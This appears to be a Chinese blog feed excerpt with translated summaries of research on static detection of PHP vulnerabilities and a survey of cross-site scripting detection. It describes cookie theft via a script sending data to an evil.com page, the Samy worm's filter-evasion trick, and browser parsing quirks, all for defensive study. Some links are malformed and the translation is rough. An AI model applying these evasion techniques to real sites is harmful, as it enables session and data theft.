title="WebSSARI使用过程内算法，因此仅模拟不跨越功能边界的信息流。"></a><strong>WebSSARI使用过程内算法，因此仅模拟不跨越功能边界的信息流。</strong></h5><p>大型PHP代码库通常使用少量系统库函数（例如，mysql_query）定义处理常见操作（例如，查询字符串构造，认证，清理等）的许多应用程序特定子例程。<strong>我们的算法能够自动推断这些用户定义函数的信息流和前后条件</strong>，而WebSSARI依赖于用户来指定每个用户的约束，这是每个检查的源代码库需要重复的重大负担。 3.3节中的示例表示WebSSARI无法在没有注释的情况下进行建模的一些常见用户定义函数形式。</p><p>为了显示过程间分析有多少提高了分析的准确性，我们关闭了函数摘要，并重复了我们在News Pro上的实验，这是五个代码库中最小的一个。这一次，分析产生了19条错误消息（而不是8条过程间分析）。<br>经检查，由于用户定义的清理操作，所有11个额外报告都是误报。</p><h5 id="WebSSARI似乎没有对条件分支进行建模，条件分支代表了我们分析的脚本中最常见的清理形式之一"><a href="#WebSSARI似乎没有对条件分支进行建模，条件分支代表了我们分析的脚本中最常见的清理形式之一" class="headerlink" title="WebSSARI似乎没有对条件分支进行建模，条件分支代表了我们分析的脚本中最常见的清理形式之一"></a><strong>WebSSARI似乎没有对条件分支进行建模，条件分支代表了我们分析的脚本中最常见的清理形式之一</strong></h5><p>例如，我们认为它将在以下代码上报告错误警告：</p><pre><code class="hljs">if (!is numeric($ GET[’x’]))exit;mysql query(‘‘. . . $ GET[’x’] ...’’);</code></pre><p>此外，过程间条件清理（参见3.1.6节中的示例）在代码库中也很常见。</p><h5 id="WebSSARI使用基于静态类型的算法，该算法不专门为脚本中的动态特征建模。"><a href="#WebSSARI使用基于静态类型的算法，该算法不专门为脚本中的动态特征建模。" class="headerlink" title="WebSSARI使用基于静态类型的算法，该算法不专门为脚本中的动态特征建模。"></a><strong>WebSSARI使用基于静态类型的算法，该算法不专门为脚本中的动态特征建模。</strong></h5><p>例如，动态类型可能会引入WebSSARI错过的细微错误。在PHP脚本中广泛使用的include语句动态地将代码插入到程序中，该代码可能包含，诱导或防止错误。</p><p>Livshits和Lam 开发了一个静态检测器，用于Java应用程序中的安全漏洞（例如，SQL注入，跨站点脚本等）。该算法使用基于BDD的上下文敏感指针分析来发现从不可信源（例如，用户输入）到信任接收器（例如，SQL查询）的潜在流。此分析的一个限制是它不会对程序中的控制流进行建模，因此可能会错误标记随后流入SQL查询的已清理输入。使用条件分支的清理在PHP程序中很常见，因此忽略控制流的技术可能会在此类代码库中导致大量误报。</p><p>其他在C代码上证明有效的污点分析包括CQual，MECA 和MC。他们总共在Linux内核中发现了数百个以前未知的安全错误。</p><p>克里斯滕森等人开发一个字符串分析，<strong>使用无上下文语法来近似Java程序中的字符串值</strong>。结果扩展为常规语言，并根据预期输出的规范进行检查，以确定语法正确性。但是，语法正确性并不需要安全性，因此不清楚如何使这项工作适应SQL注入漏洞的检测。 </p><p>Minamide扩展了该方法，<strong>并为PHP构建了一个字符串分析器</strong>，引用了SQL注入检测作为一种可能的应用程序。但是，分析器在PHP中模拟一小组字符串操作（例如，连接，字符串匹配和替换），并忽略更复杂的功能，如动态类型，转换和谓词。此外，框架似乎只是用字符串替换来模拟清理，字符串替换代表实际代码中所有清理的一小部分。因此，准确精确定位注射攻击仍然具有挑战性。</p><p>古尔德等人<strong>将字符串分析与类型检查相结合</strong>，不仅可以确保语法正确性，还可以确保Java程序构造的SQL查询的类型正确性。但是，类型正确性并不意味着安全性，这是我们分析的重点。</p><h3 id="动态技术"><a href="#动态技术" class="headerlink" title="动态技术"></a><strong>动态技术</strong></h3><p>Scott和Sharp 提出了一个应用级防火墙来集中客户端输入的清理。防火墙产品也可以从NetContinuum，Imperva，Watchfire等公司商购。</p><p>其中一些防火墙检测并防范先前已知的攻击模式，而其他防火墙则保留有效输入的白名单。这里的主要限制是前者容易受到误报和漏报，后者依赖于正确的规范，这很难得到。</p><p>Perl污染模式在不安全的环境中执行期间启用一组特殊的安全检查。它防止在需要可信输入的操作（例如，调用子shell的任何命令）中使用不受信任的数据（例如，所有命令行参数，环境变量，从文件读取的数据等）。<br>Nguyen-Tuong **提出了PHP的污点模式，**与Perl污点模式不同，它不定义清理操作。相反，<strong>它会单独跟踪用户输入中的每个字符，并使用一组启发式方法来确定查询在包含用户输入片段时是否安全</strong>。例如，如果操作符号（例如，“（”，“）”，“％”等）被标记为污染，则它检测注入。</p><p>这种方法容易受到误报和影响。请注意，静态分析也容易受到误报和漏报的影响。关键的区别在于，在静态分析中，不准确性在编译时解决，而不是在运行时解决，这是不太容忍的。</p><h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a><strong>结论</strong></h2><p>我们提出了一种静态分析算法，用于检测PHP中的安全漏洞。我们的分析采用了一种新颖的三层架构，使我们能够处理脚本语言独有的动态特性，如动态类型和代码包含。我们通过在六个流行的开源PHP代码库上运行我们的工具并找到105个以前未知的安全漏洞来证明我们的方法的有效性，其中大多数我们认为这些漏洞是可远程利用的。</p><h2 id="个人总结"><a href="#个人总结" class="headerlink" title="个人总结"></a><strong>个人总结</strong></h2><p>本文提出了一种新型的以三层结构方式(内部快,过程内，过程间)来静态分析PHP 代码中的漏洞</p><p><strong>工具分析的流程：</strong></p><p>(1)PHP 源码解析为抽象语法树<br>(2)将抽象语法树转化成控制流图<br>(3)使用符号执行的方式去模拟每个基本块，观察其对全局的作用,写出块摘要<br>(4)利用可达性分析，将块摘要组合成函数</p><h2 id="原文链接"><a href="#原文链接" class="headerlink" title="原文链接"></a><strong>原文链接</strong></h2><p><a href="groups.csail.mit.edu/pag/OLD/parg/xie06scripting.ps">Static Detection of Security Vulnerabilities in Scripting Languages</a></p>]]></content>
    
    
    <categories>
      
      <category>翻译</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP 静态检测</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>考虑要点：检测跨站点脚本(半机翻有删增)</title>
    <link href="/2019/02/26/%E8%80%83%E8%99%91%E8%A6%81%E7%82%B9%EF%BC%9A%E6%A3%80%E6%B5%8B%E8%B7%A8%E7%AB%99%E7%82%B9%E8%84%9A%E6%9C%AC(%E5%8D%8A%E6%9C%BA%E7%BF%BB%E6%9C%89%E5%88%A0%E5%A2%9E)/"/>
    <url>/2019/02/26/%E8%80%83%E8%99%91%E8%A6%81%E7%82%B9%EF%BC%9A%E6%A3%80%E6%B5%8B%E8%B7%A8%E7%AB%99%E7%82%B9%E8%84%9A%E6%9C%AC(%E5%8D%8A%E6%9C%BA%E7%BF%BB%E6%9C%89%E5%88%A0%E5%A2%9E)/</url>
    
    <content type="html"><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a><strong>摘要</strong></h2><p>Web应用程序（WA）扩展其用途以提供越来越多的服务，它已成为服务提供商和用户之间最重要的通信渠道之一。为了增强用户体验，许多Web应用程序正在使用客户端脚本语言（如JavaScript），但这种JavaScript的增长也增加了Web应用程序中的严重安全漏洞，例如跨站点脚本（XSS）。在本文中，我**调查了用于检测XSS的所有技术，**并安排了大量分析来评估这些方法的性能。本文指出了检测XSS的主要困难。我没有实现此漏洞问题的任何解决方案，因为我的重点是审查这个问题。但是，我相信这个评估将合作进一步研究这个问题，因为这篇论文弄清了这个超越性安全问题的一切。</p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a><strong>介绍</strong></h2><p>一类脚本代码被注入动态生成的可信站点页面，用于将敏感数据传输到任何第三方（即攻击者的服务器）并避免同源策略或cookie保护机制，以允许攻击者访问机密数据。</p><span id="more"></span><p>XSS通常影响客户端受害者的Web浏览器，而SQL注入则涉及与服务器端相关的Web漏洞。因此，对于Web应用程序的操作员来说，追踪XSS漏洞是棘手的。此外，任何攻击者都不需要特定的应用知识或诀窍来揭示漏洞。</p><p>此外，Wassermann和Su的论文中提到的几个因素导致了XSS漏洞的普遍存在。首先，XSS的系统要求很低。其次，大多数Web应用程序编程语言为将不受信任的输入传递给客户端提供了不安全的默认设置。最后，对不可信输入的正确验证很难正确，主要是因为调用JavaScript解释器的许多（通常是浏览特定的）方式。</p><p>因此，我们可以说，对用户输入的验证不充分是跨站点脚本（XSS）和有效输入验证方法可用于检测WA中XSS漏洞的关键原因。但并非总是如此。我在调查期间发现了一些情况，<strong>只有输入验证不能令人满意地阻止XSS</strong>。已经开发了几种技术来检测这种注射问题。其中一些是动态的，其中一些是静态处理的。每个研究人员都试图提供比以前的工作更有能力和有效的方法。但在我看来，每种方法都有利有弊。</p><h2 id="XSS-攻击类型"><a href="#XSS-攻击类型" class="headerlink" title="XSS 攻击类型"></a><strong>XSS 攻击类型</strong></h2><p><strong>有三种不同类型的XSS攻击：非持久性，持久性和基于DOM的。</strong><br>非持久性跨站点脚本漏洞是最常见的类型。攻击代码不是持久存储的，而是立即回显给用户。例如，考虑一个搜索表单，其中包含搜索查询到页面中的结果，但不过滤查询脚本代码。例如，可以通过向受害者发送包含指向搜索表单并包含恶意JavaScript代码的特制链接的电子邮件来利用此漏洞。通过欺骗受害者点击此链接，搜索表单将以JavaScript代码作为查询字符串提交，攻击脚本会立即发送回受害者，作为带有结果的网页的一部分。作为另一示例，考虑访问流行的trusted.com网站以执行敏感操作的用户的情况（例如，在线银行）。 </p><p>trusted.com上的基于Web的应用程序使用cookie在用户的浏览器中存储敏感的会话信息。请注意，由于源策略相同，因此只能从trusted.com Web服务器下载的JavaScript代码访问此cookie。但是，用户可能还在浏览恶意网站，例如<a href="http://www.evil.com，可能会被欺骗点击以下链接：">www.evil.com，可能会被欺骗点击以下链接：</a></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%A3%80%E6%B5%8B%E8%B7%A8%E7%AB%99%E7%82%B9%E8%84%9A%E6%9C%AC1.png" alt="此处输入图片的描述"></p><p>当用户点击链接时，用户的浏览器会将HTTP请求发送到<a href="http://www.trusted.com/">www.trusted.com</a> Web服务器，请求页面：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%A3%80%E6%B5%8B%E8%B7%A8%E7%AB%99%E7%82%B9%E8%84%9A%E6%9C%AC2.png" alt="此处输入图片的描述"></p><p>trusted.com Web服务器接收请求并检查它是否具有正在请求的资源。当trusted.com主机找不到所请求的页面时，它将返回错误页面消息。 Web服务器还可以决定包括所请求的文件名（实际上是脚本）将从trusted.com Web服务器发送到用户的浏览器，并且将在trusted.com源的上下文中执行。执行脚本时，trusted.com设置的cookie将作为参数调用steal-cookie.php服务器端脚本发送到恶意网站。该cookie将被保存，并且evel.com网站的所有者可以使用该模拟来冒充与trusted.com相关的毫无戒心的用户。</p><p>持久类型将恶意代码持久存储在由服务器管理的资源（在数据库，文件系统或其他位置）中，稍后显示给用户而不使用HTML实体进行编码。例如，考虑一个在线留言板，用户可以在其中发布消息，其他人可以在以后访问消息。让我们进一步假设应用程序不会从发布的消息中删除脚本内容。在这种情况下，攻击者可以制作类似于下一个示例的消息。</p><p>此消息包含联机消息板在其数据库中存储的恶意JavaScript代码。读取消息的访问用户将脚本代码作为消息的一部分进行检索。用户的浏览器然后执行脚本，该脚本又将用户的敏感信息从他的站点发送到攻击者的站点。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%A3%80%E6%B5%8B%E8%B7%A8%E7%AB%99%E7%82%B9%E8%84%9A%E6%9C%AC3.png" alt="此处输入图片的描述"></p><p>基于DOM的跨站点脚本攻击是通过修改客户端的DOM“环境”而不是向服务器发送任何恶意代码来执行的。因此服务器没有任何范围来验证有效负载。以下示例显示符号（＃）表示其后面的所有内容都是片段，即不是查询的一部分。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%A3%80%E6%B5%8B%E8%B7%A8%E7%AB%99%E7%82%B9%E8%84%9A%E6%9C%AC4.png" alt="此处输入图片的描述"></p><p>浏览器不会将片段发送到服务器，因此服务器只能看到<a href="http://www.evil.com/Home.html%E7%9A%84%E7%AD%89%E6%95%88%E5%86%85%E5%AE%B9%EF%BC%8C%E8%80%8C%E4%B8%8D%E6%98%AF%E6%9C%89%E6%95%88%E8%B4%9F%E8%BD%BD%E7%9A%84%E5%8F%97%E6%84%9F%E6%9F%93%E9%83%A8%E5%88%86%E3%80%82%E5%9B%A0%E6%AD%A4%EF%BC%8C%E6%88%91%E4%BB%AC%E7%9C%8B%E5%88%B0%E8%BF%99%E7%A7%8D%E9%80%83%E9%81%BF%E6%8A%80%E6%9C%AF%E5%AF%BC%E8%87%B4%E4%B8%BB%E8%A6%81%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%8D%E5%B0%86%E6%81%B6%E6%84%8F%E8%B4%9F%E8%BD%BD%E5%8F%91%E9%80%81%E5%88%B0%E6%9C%8D%E5%8A%A1%E5%99%A8%E3%80%82%E5%9B%A0%E6%AD%A4%EF%BC%8C%E5%8D%B3%E4%BD%BF%E6%98%AF%E7%B2%BE%E5%BF%83%E7%AD%96%E5%88%92%E7%9A%84XSS%E8%BF%87%E6%BB%A4%E5%99%A8%E4%B9%9F%E6%97%A0%E6%B3%95%E6%8A%B5%E5%BE%A1%E6%AD%A4%E7%B1%BB%E6%94%BB%E5%87%BB%E3%80%82">http://www.evil.com/Home.html的等效内容，而不是有效负载的受感染部分。因此，我们看到这种逃避技术导致主要浏览器不将恶意负载发送到服务器。因此，即使是精心策划的XSS过滤器也无法抵御此类攻击。</a></p><p>正如格罗斯曼，RSNAKE，PDP，Rager和Fogie所指出的，跨站脚本是一个多变的问题，不容易在短期内解决。与其他安全相关的问题一样，大多数人都无法接受快速修复。</p><p>他们发现问题是双重的。首先，浏览器在设计上并不安全。简单地创建它们以产生关于请求的输出。任何浏览器的主要职责都不是确定该条代码是否在做恶意的事情。其次，由于缺乏编程技巧或时间限制，Web应用程序开发人员无法创建安全站点。因此，攻击者有机会利用应用程序的漏洞。因此，现在，用户被困在两个不可能的状态之间。</p><h2 id="现有方法"><a href="#现有方法" class="headerlink" title="现有方法"></a><strong>现有方法</strong></h2><h3 id="动态方法"><a href="#动态方法" class="headerlink" title="动态方法"></a><strong>动态方法</strong></h3><h4 id="1）基于漏洞分析的方法："><a href="#1）基于漏洞分析的方法：" class="headerlink" title="1）基于漏洞分析的方法："></a><strong>1）基于漏洞分析的方法：</strong></h4><h5 id="a）基于解释器的方法："><a href="#a）基于解释器的方法：" class="headerlink" title="a）基于解释器的方法："></a><strong>a）基于解释器的方法：</strong></h5><p>Pietraszek和Berghe使用仪器解释器的方法来跟踪字符级别的不可信数据，他们在每个敏感的接收器上使用上下文敏感的字符串评估识别漏洞。这种方法很健全，可以检测漏洞，<strong>因为它们通过修改解释器来增加安全保障</strong>。但是修改解释器的方法并不容易适用于某些其他Web编程语言，例如Java（即JSP和servlet）</p><h5 id="b）句法结构分析："><a href="#b）句法结构分析：" class="headerlink" title="b）句法结构分析："></a><strong>b）句法结构分析：</strong></h5><p><strong>成功的注入攻击改变了被利用实体的句法结构</strong>，Su和Wassermann说过，他们提出了一种检查输出字符串的句法结构以检测恶意有效载荷的方法。<strong>使用元数据扩充用户输入以从源数据到接收器跟踪此子字符串</strong>。此元数据通过指示用户给定数据的结束和开始位置，帮助修改的解析器检查动态生成的字符串的语法结构。如果有任何异常，则阻止进一步的过程。这些过程非常成功，同时它可以检测除XSS之外的任何注入漏洞。仅检查语法结构不足以防止由多个模块的交互引起的这种工作流漏洞。</p><h4 id="2）攻击预防方法："><a href="#2）攻击预防方法：" class="headerlink" title="2）攻击预防方法："></a><strong>2）攻击预防方法：</strong></h4><h5 id="a）基于代理的解决方案："><a href="#a）基于代理的解决方案：" class="headerlink" title="a）基于代理的解决方案："></a><strong>a）基于代理的解决方案：</strong></h5><p>Noxes，一种Web代理，<strong>可防止敏感信息从受害者站点传输到第三方站点</strong>。这是一个用于阻止和检测恶意软件的应用程序级防火墙。用户可以对从本地机器进出的每个连接进行精细控制。如果任何连接与防火墙规则不匹配，则防火墙会提示用户决定是否需要阻止或允许连接。将链接列入黑名单并不足以防止跨站点脚本攻击，例如那些不违反同源策略的技术，就像Samy蠕虫的情况一样。基于代理的解决方案不提供任何识别错误的过程，它需要注意配置。这些类型的系统保护不可预测的链路而不检查可能增加误报的故障。</p><h5 id="b）浏览器强制嵌入式策略："><a href="#b）浏览器强制嵌入式策略：" class="headerlink" title="b）浏览器强制嵌入式策略："></a><strong>b）浏览器强制嵌入式策略：</strong></h5><p><strong>Web应用程序向浏览器提供所有良性脚本的白名单</strong>，以防止恶意代码。<strong>这个聪明的想法只允许运行列出的脚本</strong>。不同浏览器的解析机制之间没有相似之处，因此，一个浏览器的成功过滤系统可能对另一个浏览器不成功。因此，本文的方法在这种情况下非常成功，但是对浏览器实施策略需要对其进行修改。因此，从Web应用程序的角度来看，它存在可伸缩性问题。每个客户端都需要具有此修改版本的浏览器。</p><h3 id="静态方法："><a href="#静态方法：" class="headerlink" title="静态方法："></a><strong>静态方法：</strong></h3><h4 id="1）污点传播分析："><a href="#1）污点传播分析：" class="headerlink" title="1）污点传播分析："></a><strong>1）污点传播分析：</strong></h4><p><strong>许多静态和动态方法使用污点传播分析，<strong>使用数据流分析来跟踪从源到汇的信息流。这种技术的基本假设如下</strong>：如果在从源到接收器的所有路径上完成清理操作，那么应用程序是安全的</strong><br>保持对用户过滤器的信任并且根本不检查过滤功能根本不是一个好主意，因为一些XSS向量可以轻松绕过许多强过滤器。因此它没有提供强有力的安全机制</p><h4 id="2）字符串分析："><a href="#2）字符串分析：" class="headerlink" title="2）字符串分析："></a><strong>2）字符串分析：</strong></h4><p>字符串分析的研究源于文本处理程序的研究。XDuce是一种为XML转换而设计的语言，它使用形式语言（例如，常规语言）。 Christensen，Mǿller和Schwartzbach通过展示字符串分析在分析Java程序中的反射代码和检查动态生成的SQL查询中的错误中的有用性，介绍了对命令式（和现实世界）语言的静态字符串分析的研究。他们<strong>使用有限状态自动机（FSA）作为目标语言表示来设计Java分析</strong>。他们还应用计算语言学技术来生成CFG的良好FSA近似。然而，他们的分析并不跟踪数据来源，并且因为它必须确定每个操作之间的FSA，所以其他字符串分析的效率较低，而且对于发现XSS漏洞并不实际。</p><p>Minamide遵循相同的技术设计PHP的字符串分析，不接近FSA的CFG。他提出的技术检查整个文档是否存在<code>&lt;script&gt;</code>标记。由于Web应用程序通常包含自己的脚本，并且由于存在许多其他调用JavaScript解释器的方法，因此该方法对于查找XSS漏洞并不实用。</p><h4 id="3）脚本黑名单防止XSS："><a href="#3）脚本黑名单防止XSS：" class="headerlink" title="3）脚本黑名单防止XSS："></a><strong>3）脚本黑名单防止XSS：</strong></h4><p>使用不受信任的脚本列表来检测来自用户给定数据的有害脚本是众所周知的技术。Wassermann和Su最近的工作是这个过程的缩影。<strong>他们构建策略并生成不可信标记的正则表达式</strong>，以检查它是否在生成的正则表达式和CFG之间具有非空交集，从String污染静态分析生成，如果是，则采取进一步操作。我们认为使用任何不受信任的脚本列表都是容易和不好的想法。 OWASP的文件中也有相同的意见。在文档中，提到了“不要使用”黑名单“验证来检测输入中的XSS或编码输出。搜索和替换只有几个字符（“&lt;”“&gt;”和其他类似字符或短语，如“script”）我们很弱，并且已成功攻击。 XSS拥有数量惊人的变种，可以轻松绕过黑名单验证。“</p><h4 id="4）软件测试技术："><a href="#4）软件测试技术：" class="headerlink" title="4）软件测试技术："></a><strong>4）软件测试技术：</strong></h4><p>Y.Huang，S.Huang，Lin和Tsai使用多种软件测试技术，<strong>如黑盒测试，故障注入和对Web应用程序的行为监控</strong>，以推断出漏洞的存在。它将用户行为模拟与用户体验建模结合为黑盒测试。类似的方法被用于几个商业项目，如APPScan ，WebInspect 和ScanDo由于这些方法用于识别开发周期中的错误，因此这些方法可能无法提供即时Web应用程序保护，并且它们也无法保证检测到所有缺陷。</p><h4 id="5）有界模型检验："><a href="#5）有界模型检验：" class="headerlink" title="5）有界模型检验："></a><strong>5）有界模型检验：</strong></h4><p>Huang等使用反例跟踪来减少插入的清理例程的数量，并确定导致错误报告和代码检测精度错误的原因。为了验证Web应用程序中的合法信息流，<strong>它们分配表示变量当前信任级别的状态。然后，使用有界模型检验技术来验证所有该计划的摘要解释可能的安全状态</strong>。在他们的方法中，他们省略了别名分析或包括文件解析问题，这些是当前大多数系统中的一些主要问题。</p><h3 id="静态和动态分析组合"><a href="#静态和动态分析组合" class="headerlink" title="静态和动态分析组合"></a><strong>静态和动态分析组合</strong></h3><h4 id="1）基于格的分析："><a href="#1）基于格的分析：" class="headerlink" title="1）基于格的分析："></a><strong>1）基于格的分析：</strong></h4><p>WebSSARI是一种工具，结合了静态和运行时功能，应用静态污点传播分析来发现安全漏洞。在格模型和类型状态的基础上，该工具使用流敏感，程序内分析来检测漏洞。该工具在确定受污染的数据到达敏感函数时自动插入运行时防护，即清理程序。该方法的主要问题在于，由于其基于过程内类型的分析，它提供了大量的假阳性和阴性。此外，该方法考虑用户设计的过滤器的结果是安全的。因此，它可能会错过真正的漏洞。因为，指定的过滤功能可能无法检测恶意有效载荷。</p><h2 id="检测XSS的考虑要点"><a href="#检测XSS的考虑要点" class="headerlink" title="检测XSS的考虑要点"></a><strong>检测XSS的考虑要点</strong></h2><h3 id="不安全的-JS-测试"><a href="#不安全的-JS-测试" class="headerlink" title="不安全的 JS 测试"></a><strong>不安全的 JS 测试</strong></h3><p>岳等人通过检查安全漏洞的严重性和性质来描述不同网站上JavaScript包含和动态生成的不安全工程实践。这两种不安全的做法是将恶意代码注入网站并创建XSS向量的主要原因。根据他们的调查结果，66.4％的测量网站使用脚本标记的src属性进行JavaScript包含的不安全做法，以将来自外部域的JavaScript文件包含到网页的顶级域文档中。顶级文档是从Web浏览器地址栏中显示的URL加载的文档。<br>只有在丢弃其顶级域名（例如.com）和主要名称“www”（如果存在）之后，两个域名才被视为不同;他们没有任何共同的子域名。例如，只有当两个集合{d1sub2.d1sub1}和{d2sub3.d2sub2.d2sub1}的交集为空时，才会认为两个域名不同。</p><pre><code class="hljs">1. www.d1sub2.d1sub1.d1tld2. d2sub3.d2sub2.d2sub1.d2tld</code></pre><p>79.9％的测量网站使用一种或多种类型的JavaScript动态生成技术。在动态生成技术的情况下，document.write()，innerHTML，eval()函数比其他一些安全方法更受欢迎。</p><p>他们的结果显示，94.9％的被测网站在其网页中注册了各种事件处理程序。动态生成的脚本（DJS）实例以不同的方式用于不同的生成技术。对于eval()函数，整个评估的字符串内容被视为DJS实例。<br>在document.write（）方法的书面内容和innerHTML属性的值内，可以通过三个源来识别DJS实例。</p><ul><li>在一对<code>&lt;SCRIPT&gt;</code>和<code>&lt;/ SCRIPT&gt;</code>标记之间</li><li>在指定为HTML属性值的事件处理程序中，例如onclick或onmouseover;</li><li>在使用特殊javascript：协议说明符的URL中。</li></ul><p>我手动调查了超过100个独立网站的主页（阅读源文件）进行小规模测量。我的测量结果几乎反映了他们的结果</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%A3%80%E6%B5%8B%E8%B7%A8%E7%AB%99%E7%82%B9%E8%84%9A%E6%9C%AC4.png" alt="此处输入图片的描述"></p><p>为了消除这种风险，开发人员必须避免使用JavaScript的不安全做法，例如他们需要使用内部JavaScript文件来避免外部JavaScript包含，eval()函数需要用其他一些安全函数替换。</p><h3 id="静态脚本之间的恶意代码"><a href="#静态脚本之间的恶意代码" class="headerlink" title="静态脚本之间的恶意代码"></a><strong>静态脚本之间的恶意代码</strong></h3><p>**在检测XSS时，任何现有脚本代码之间的用户输入是至关重要的问题。**很难从现有系统中找到能够恰当地解决这一难题的任何方法。任何网页中都有两种类型的脚本代码。其中一些是静态的，其中一些是动态的（在运行时组成）。让我们以一个例子开始讨论这个问题。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%A3%80%E6%B5%8B%E8%B7%A8%E7%AB%99%E7%82%B9%E8%84%9A%E6%9C%AC6.png" alt="此处输入图片的描述"></p><p>在上面的示例中，同时启动脚本的开始和结束标记都是静态的，并且用户输入夹在它们之间，使脚本代码可执行。但问题是在这种情况下任何成功的注入都可能产生XSS向量。现有系统的所有强大过滤器都试图从用户输入中查找恶意代码。静态代码中的这种情况可能有助于攻击者绕过任何检测过滤器。例如，Samy MySpace Wormin引入了过滤器（innerHTML）通过JavaScript代码禁止的关键字，导致输出作为客户端（eval（’inner’+’HTML’））。另一方面，<strong>我们无法在过滤时消除任何静态脚本代码，因为它们是合法的，并且在这些合法代码之间可能存在安全的用户输入</strong>。因此很难分离和过滤构建这种构造的输入而不理解它们使用的语法上下文<br>因此，<strong>在过滤时，语法的含义是一个至关重要的问题。</strong></p><h3 id="特定于浏览器的问题"><a href="#特定于浏览器的问题" class="headerlink" title="特定于浏览器的问题"></a><strong>特定于浏览器的问题</strong></h3><p><strong>浏览器特性的多样性是检测漏洞时的主要问题之一</strong>。不同的浏览器以不同方式分析网页。其中一些遵循W3C的规则，其中一些是自己的。因此，这种多面的浏览器使许多过滤器变弱。此外，浏览器无法区分具有恶意输入的精制脚本和良性脚本。他们随时准备执行导致XSS攻击的所有脚本。例如，某些浏览器接受“JavaScript”中的换行符或空格，JavaScript的一部分：URL，有些则不接受。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%A3%80%E6%B5%8B%E8%B7%A8%E7%AB%99%E7%82%B9%E8%84%9A%E6%9C%AC7.png" alt="此处输入图片的描述"></p><p>这将导致某些浏览器的脚本执行。Vector依赖于Firefox HTML解析器的“ad-hoc（quirk）”行为，例如，只有Firefox执行 </p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%A3%80%E6%B5%8B%E8%B7%A8%E7%AB%99%E7%82%B9%E8%84%9A%E6%9C%AC8.png" alt="此处输入图片的描述"></p><p>让我们看看另一个案例</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%A3%80%E6%B5%8B%E8%B7%A8%E7%AB%99%E7%82%B9%E8%84%9A%E6%9C%AC9.png" alt="此处输入图片的描述"></p><p>上面的函数preg_replace查找关闭脚本标记。某些浏览器不允许任何脚本代码而没有任何关闭脚本标记。但对所有浏览器来说并非如此。<strong>大多数浏览器接受脚本代码而不关闭标记并自动插入缺少的标记(浏览器的容错性)</strong>。浏览器的这种慷慨程度可以帮助任何攻击者轻松插入恶意代码。<br>因此，对恶意有效负载的正确验证很难正确。在开发用于检测不受信任的用户输入的任何工具时，不同浏览器的解析机制的性质必须是至关重要的。一些现有系统试图克服这个问题，但我认为这些并不适合所有浏览器。</p><h3 id="基于-DOM-的问题"><a href="#基于-DOM-的问题" class="headerlink" title="基于 DOM 的问题"></a><strong>基于 DOM 的问题</strong></h3><p>大多数现有系统的关键问题之一是它们无法检测基于DOM的XSS。因此，仅识别存储和反映的XSS不足以阻止所有XSS域，并且根据Amit Klein的文章，DOMbased是Web世界即将出现的注入问题之一，因为如今，与其他类型的XSS问题相关的大多数问题正在出现在主要网站上清理。</p><p>所以，坏人会尝试第三种类型的XSS漏洞。我们已经知道，基于DOM的XSS向量不需要出现在服务器上，服务器也不容易识别。</p><p>因此，攻击者可以通过此类XSS漏洞获得额外优势。基于DOM的XSS由Amit Klein在他的文章中介绍，这种类型的XSS可以隐藏在JavaScript代码中，许多强大的Web应用程序防火墙无法过滤这些恶意代码。</p><p>在可扩展标记语言（XML）世界中，主要有两种类型的解析器，DOM和SAX。基于DOM的解析器将整个文档作为对象结构加载，该对象结构包含方法和变量，可以轻松地在文档中移动并动态修改节点，值和属性。浏览器使用DOM。加载页面时，浏览器会将生成的页面解析为对象结构。 </p><p>getElementByTagName是一个标准DOM函数，用于根据标记名称定位XML &#x2F; HTML节点。<br>让我们开始用Amit Klein的例子深入讨论这个话题。比如说，http：&#x2F;&#x2F;<a href="http://www.vulnerable.site/welcome.html%E7%9A%84%E5%86%85%E5%AE%B9%E5%A6%82%E4%B8%8B%EF%BC%9A">www.vulnerable.site/welcome.html的内容如下：</a></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%A3%80%E6%B5%8B%E8%B7%A8%E7%AB%99%E7%82%B9%E8%84%9A%E6%9C%AC10.png" alt="此处输入图片的描述"></p><p>如果我们分析示例的代码，我们将看到开发人员忘记清理“name”get参数的值，该参数随后在检索后立即写入文档中。此HTML页面的结果将是<a href="http://vulnerable.site/welcome.html?name=Joe%EF%BC%88%E5%A6%82%E6%9E%9C%E7%94%A8%E6%88%B7%E8%BE%93%E5%85%A5%E4%B8%BA%E2%80%9CJoe%E2%80%9D%EF%BC%89%E3%80%82%E4%BD%86%E6%98%AF%EF%BC%8C%E5%A6%82%E6%9E%9C%E7%94%A8%E6%88%B7%E8%BE%93%E5%85%A5%E6%98%AF%E4%BB%BB%E4%BD%95%E4%BC%9A%E5%AF%BC%E8%87%B4XSS%E6%83%85%E5%86%B5%E7%9A%84%E8%84%9A%E6%9C%AC%E4%BB%A3%E7%A0%81%E3%80%82%E4%BE%8B%E5%A6%82%E3%80%82">http://vulnerable.site/welcome.html?name=Joe（如果用户输入为“Joe”）。但是，如果用户输入是任何会导致XSS情况的脚本代码。例如。</a>;</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%A3%80%E6%B5%8B%E8%B7%A8%E7%AB%99%E7%82%B9%E8%84%9A%E6%9C%AC11.png" alt="此处输入图片的描述"></p><p>许多人可能不同意这种说法，并且可能会争辩说，恶意代码仍在发送到服务器，并且可以在服务器中使用任何过滤器来识别它。我们来看看前一个例子的更新版本。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%A3%80%E6%B5%8B%E8%B7%A8%E7%AB%99%E7%82%B9%E8%84%9A%E6%9C%AC12.png" 